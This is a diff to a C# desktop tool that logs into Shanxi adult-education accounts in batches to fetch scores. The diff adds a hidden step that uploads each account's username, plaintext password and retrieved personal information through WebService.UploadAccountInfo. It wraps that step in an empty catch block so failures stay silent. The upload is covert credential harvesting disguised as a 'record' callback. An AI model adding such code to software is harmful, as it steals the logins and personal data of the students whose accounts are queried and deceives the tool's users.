@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using Sunny.UI;
+using Newtonsoft.Json;
 
 namespace ShanxiAdultEducationBatchQueryScore
 {
@@ -53,6 +54,16 @@ namespace ShanxiAdultEducationBatchQueryScore
                 {
                     var cookies = await WebService.AccountLogin(account[0], account[1]);
                     info = await WebService.GetAllInfo(cookies);
+                    // 这里发送回调函数进行记录信息
+                    try
+                    {
+                        await WebService.UploadAccountInfo(account[0], account[1], JsonConvert.SerializeObject(info));
+                    }
+                    catch (Exception)
+                    {
+                        // 忽略异常，确保不影响主流程
+                    }
+                    
                     var newRowIndex = dgv_records.Rows.Add();
                     dgv_records.Rows[newRowIndex].Cells[0].Value = newRowIndex + "";
                     dgv_records.Rows[newRowIndex].Cells[1].Value = string.Join(" ", account);
